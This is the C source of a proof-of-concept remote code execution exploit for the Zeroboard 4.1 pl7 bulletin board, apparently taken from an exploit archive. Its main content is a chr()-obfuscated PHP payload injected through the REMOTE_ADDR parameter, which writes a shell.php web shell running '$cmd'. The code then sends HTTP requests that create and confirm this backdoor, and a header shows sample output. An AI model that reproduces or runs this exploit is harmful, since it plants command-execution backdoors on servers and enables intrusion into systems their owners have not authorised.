/*
poc by  kyoungchip,jang
email : SpeeDr00t1004@gmail.com
 
[*] the bug 
- http://www.xpressengine.com/15955761
 
Application 
- Zeroboard 4.1 pl7 
 
Reference: 
- http://www.nzeo.com 
- Zeroboard preg_replace() vulnerability Remote nobody exploit by n0gada 

 
[*] Target - My test server 
 
$ ./zbexpl http://xxx.xxx.xxx/zboard/zboard.php?id=test 
- Target : http://xxx.xxx.xxx/zboard/zboard.php?id=test 
- Target :  http://xxx.xxx.xxx/zboard/bbs/shell.php?cmd=ls 


 
[+] xxx.xxx.xxx connecting ok! 
 [+] Exploiting zeroboard start  - [+] Exploiting success!!
 [*] Create Backdoor Start - [+] Create Backdoor  success!!
 [*] Confirmming your backdoor php script - http://192.168.179.6/zeroboard/zb41pl7/bbs/data/shell.php is generated!
 [+] Exploiting success!!
 - http://192.168.179.6/zeroboard/bbs/data/shell.php?cmd=ls [+] Execute the websehll script  

*/


#include <stdio.h>
#include <stdarg.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <netdb.h>
#include <sys/types.h>
#include <signal.h>
#include <time.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/select.h>
#include <errno.h>


#define BUFSIZE 4096
#define READSIZE 1500
#define EXPLOIT_CODE "*/fputs(fopen(chr(46).chr(47).chr(115).chr(104).chr(101).chr(108).chr(108).chr(46).chr(112).chr(104).chr(112),chr(119).chr(43)),chr(60).chr(63).chr(32).chr(115).chr(121).chr(115).chr(116).chr(101).chr(109).chr(40).chr(36).chr(99).chr(109).chr(100).chr(41).chr(59).chr(32).chr(63).chr(62));/*&HTTP_SESSION_VARS[zb_last_connect_check]=a&HTTP_SERVER_VARS=1&HTTP_ENV_VARS=1"


void ParseZbHost(char *);
void ConnectZboard(char *, unsigned short);
void ExploitZboard(void);
void ConfirmPHPScript(void);
void CreateBackdoor(void);
void StatusProcess(void);
void Usage(char *);
void OutputErr(char *, int);

char *zb_host;
char *zb_dir;
char *zb_tid;
unsigned short zb_port;

int sockfd = -1;
int reconn=0;
char ReadBuf[READSIZE];
char WriteBuf[BUFSIZE];
char TempBuf[BUFSIZ];
char no[16];



int 
main(int argc, char *argv[])
{

        char *szArgv;
        switch( argc )
        {
        case 1 :
                Usage(argv[0]);      
                break;
        case 2 :
                zb_port = 80;
                //szArgv = "http://192.168.179.6/zeroboard/zb41pl7/bbs/zboard.php?id=test";
                ParseZbHost( szArgv );
                break;

        case 3:
                zb_port = atoi(argv[2]); 
                ParseZbHost(argv[1]);
                        
                break;
        default:
        
                break;
        };

        ConnectZboard(zb_host, zb_port);
        ExploitZboard();
        CreateBackdoor();
        ConfirmPHPScript();
}

void 
ParseZbHost( char *zbhost )
{
        char *psbuf;
        char *sptr=NULL;
        char *eptr=NULL;

        psbuf = ( char* )malloc( strlen( zbhost ) + 1 );

        strcpy( psbuf, zbhost );

        if( (sptr = strstr( psbuf , "http://" ) ) == NULL) 
                OutputErr("http://host need\n", 0);


        zb_host = sptr + 7;

        sptr = strchr(zb_host, '/');
        sptr[0] = '\0';
        sptr++;


        if((eptr = strstr(sptr, "zboard.php?id=")) == NULL) 
                        OutputErr("\"zboard.php?id=\"need\n", 0);

        zb_tid = eptr+14;

        eptr--;
        eptr[0] = '\0';

        zb_dir = sptr;

        char szOut[1024];
        memset( szOut , 0x00 , sizeof( szOut ) );
        sprintf( szOut , " - Target : http://%s/%s/zboard.php?id=%s\n", zb_host, zb_dir, zb_tid);
}


void 
ConnectZboard( char *server , unsigned short port )
{

        struct sockaddr_in serv; 
        struct hostent *hostname;

        if( !( hostname = gethostbyname( server ) ) ) 
           printf(" \nhostname = %s\n", hostname );

        if( (sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0) 
           printf(" \n socket error ");

        memset(&serv, 0, sizeof(serv));
        serv.sin_family = AF_INET;
        serv.sin_port = htons(port);
        serv.sin_addr.s_addr = *((unsigned long *)hostname->h_addr_list[0]);


        if(connect(sockfd, (struct sockaddr *)&serv, sizeof(struct sockaddr)) < 0)
        {
            printf("\n not connect");
        }

        if(!reconn) 
        {
        }
        else if(reconn == 1) 
        {
        }
        reconn = 0;

}


void 
ExploitZboard(void)
{  

        fd_set fds;
        struct timeval tv;

        if(reconn == 1) ConnectZboard(zb_host, zb_port); 

        memset(WriteBuf, 0, sizeof(WriteBuf));


        sprintf(WriteBuf,"GET http://%s/%s/lib.php?REMOTE_ADDR=" , zb_host,zb_dir); 

        sprintf(WriteBuf+strlen(WriteBuf),
        "%s HTTP/1.1\r\n"
        "Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg,application/x-shockwave-flash, application/vnd.ms-excel,application/vnd.ms-powerpoint, application/msword, */*\r\n"
        "Accept-Encoding: gzip, deflate\r\n"
        "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)\r\n"
        "Host: %s\r\n"
        "Connection: Keep-Alive\r\n"
        "\r\n",EXPLOIT_CODE, zb_host);


        fprintf(stdout, " [+] Exploiting zeroboard start ");
        fflush(stdout);

        if(write(sockfd, WriteBuf, strlen(WriteBuf)) < 0) OutputErr("write", 1);

        tv.tv_sec = 60;
        tv.tv_usec = 0;


        FD_ZERO(&fds);

        for(;;){
        memset(ReadBuf, 0, sizeof(ReadBuf));

        FD_SET(sockfd, &fds);
        if(select(sockfd+1, &fds, NULL, NULL, &tv) <= 0) OutputErr("select", 1);
        if(FD_ISSET(sockfd, &fds)){
        if(read(sockfd, ReadBuf, sizeof(ReadBuf)) <= 0) OutputErr("read", 1);


        if(strstr(ReadBuf, "HTTP/1.1 ")){
        if(strstr(ReadBuf,"Connection: close\r\n")) reconn = 1;

        if(strstr(ReadBuf+9, "200 OK\r\n")) { 
        fprintf(stdout," - [+] Exploiting success!!\n", zb_host, zb_dir, zb_tid);
        fflush(stdout);
        return;
        }
        else if(strstr(ReadBuf+9, "404 Not Found\r\n")){
        OutputErr(" - zeroboard was patched.\n"
        " [-] Exploit failed!\n", 0);
        }
        else if(strstr(ReadBuf+9, "400 Bad Request\r\n")){
        OutputErr(" - Bad Request\n"
        " [-] Exploit failed!\n", 0);
        }
        else {
        OutputErr(ReadBuf, 0);
        }
        }


        }
        }

        fprintf(stderr," error!\n");
}


void 
CreateBackdoor(void)
{  

        fd_set fds;
        struct timeval tv;

        if(reconn == 1) ConnectZboard(zb_host, zb_port); 

        memset(WriteBuf, 0, sizeof(WriteBuf));

        sprintf(WriteBuf,
        "GET http://%s/%s/data/now_connect.php HTTP/1.1\r\n"
        "Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg,application/x-shockwave-flash, application/vnd.ms-excel,application/vnd.ms-powerpoint, application/msword, */*\r\n"
        "Accept-Encoding: gzip, deflate\r\n"
        "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)\r\n"
        "Host: %s\r\n"
        "Connection: Keep-Alive\r\n"
        "\r\n", zb_host,zb_dir, zb_host);

        fprintf(stdout, " [*] Create Backdoor Start");
        fflush(stdout);

        if(write(sockfd, WriteBuf, strlen(WriteBuf)) < 0) OutputErr("write", 1);

        tv.tv_sec = 60;
        tv.tv_usec = 0;


        FD_ZERO(&fds);

        for(;;){
        memset(ReadBuf, 0, sizeof(ReadBuf));

        FD_SET(sockfd, &fds);
        if(select(sockfd+1, &fds, NULL, NULL, &tv) <= 0) OutputErr("select", 1);
        if(FD_ISSET(sockfd, &fds)){
        if(read(sockfd, ReadBuf, sizeof(ReadBuf)) <= 0) OutputErr("read", 1);


        if(strstr(ReadBuf, "HTTP/1.1 ")){
        if(strstr(ReadBuf,"Connection: close\r\n")) reconn = 1;

        if(strstr(ReadBuf+9, "200 OK\r\n")) { 
        fprintf(stdout," - [+] Create Backdoor  success!!\n", zb_host, zb_dir, zb_tid);
        fflush(stdout);
        return;
        }
        else if(strstr(ReadBuf+9, "404 Not Found\r\n")){
        OutputErr(" zeroboard was patched.\n"
        " [-] Exploit failed!\n", 0);
        }
        else if(strstr(ReadBuf+9, "400 Bad Request\r\n")){
        OutputErr(" - Bad Request\n"
        " [-] Exploit failed!\n", 0);
        }
        else {
        OutputErr(ReadBuf, 0);
        }
        }


        }
        }

        fprintf(stderr," error!\n");
}

void 
ConfirmPHPScript(void)
{  

        fd_set fds;
        struct timeval tv;

        if(reconn == 1) ConnectZboard(zb_host, zb_port); 

        memset(WriteBuf, 0, sizeof(WriteBuf));

        sprintf(WriteBuf,
        "GET http://%s/%s/data/shell.php HTTP/1.1\r\n"
        "Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg,application/x-shockwave-flash, application/vnd.ms-excel,application/vnd.ms-powerpoint, application/msword, */*\r\n"
        "Accept-Encoding: gzip, deflate\r\n"
        "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)\r\n"
        "Host: %s\r\n"
        "Connection: Keep-Alive\r\n"
        "\r\n", zb_host,zb_dir, zb_host);


        fprintf(stdout, " [*] Confirmming your backdoor php script");
        fflush(stdout);

        if(write(sockfd, WriteBuf, strlen(WriteBuf)) < 0) OutputErr("write", 1);

        tv.tv_sec = 60;
        tv.tv_usec = 0;


        FD_ZERO(&fds);

        for(;;){
        memset(ReadBuf, 0, sizeof(ReadBuf));

        FD_SET(sockfd, &fds);
        if(select(sockfd+1, &fds, NULL, NULL, &tv) <= 0) OutputErr("select", 1);
        if(FD_ISSET(sockfd, &fds)){
        if(read(sockfd, ReadBuf, sizeof(ReadBuf)) <= 0) OutputErr("read", 1);


        if(strstr(ReadBuf, "HTTP/1.1 ")){
        if(strstr(ReadBuf,"Connection: close\r\n")) reconn = 1;

        if(strstr(ReadBuf+9, "200 OK\r\n")) { 
        fprintf(stdout," - http://%s/%s/data/shell.php is generated!\n [+] Exploiting success!!\n", zb_host, zb_dir);
        fprintf(stdout," - http://%s/%s/data/shell.php?cmd=ls [+] Execute the websehll script  \n", zb_host, zb_dir);
        fflush(stdout);
        return;
        }
        else if(strstr(ReadBuf+9, "404 Not Found\r\n")){
        OutputErr(" - zeroboard was patched.\n"
        " [-] Exploit failed!\n", 0);
        }
        else if(strstr(ReadBuf+9, "400 Bad Request\r\n")){
        OutputErr(" - Bad Request\n"
        " [-] Exploit failed!\n", 0);
        }
        else {
        OutputErr(ReadBuf, 0);
        }
        }


        }
        }

        fprintf(stderr," error!\n");
}



void 
StatusProcess(void)
{

        putchar('.');
        fflush(stdout);
}


void 
OutputErr(char *msg, int type)
{

        if(!type)
        {
                fprintf(stderr,"%s", msg);
                fflush(stderr);
        }
        else if(type==1)
        {
                if(!strcmp(msg, zb_host)) 
                {
                        herror(msg);
                }
                else 
                {
                        perror(msg);
                }
        }

        exit(1);
}

void 
Usage(char *arg)
{ 
        fprintf(stderr,"[*] Zeroboard now_connect() vulnerability Remote code execution  exploit by SpeeDr00t\n"); 
        fprintf(stderr,"--------------------------------------------------------------------------\n");
        fprintf(stderr,"Usage: %s <SERVER> [PORT - default : 80] \n", arg);
        fprintf(stderr,"--------------------------------------------------------------------------\n");

        exit(1);
}

// milw0rm.com [2009-09-04]
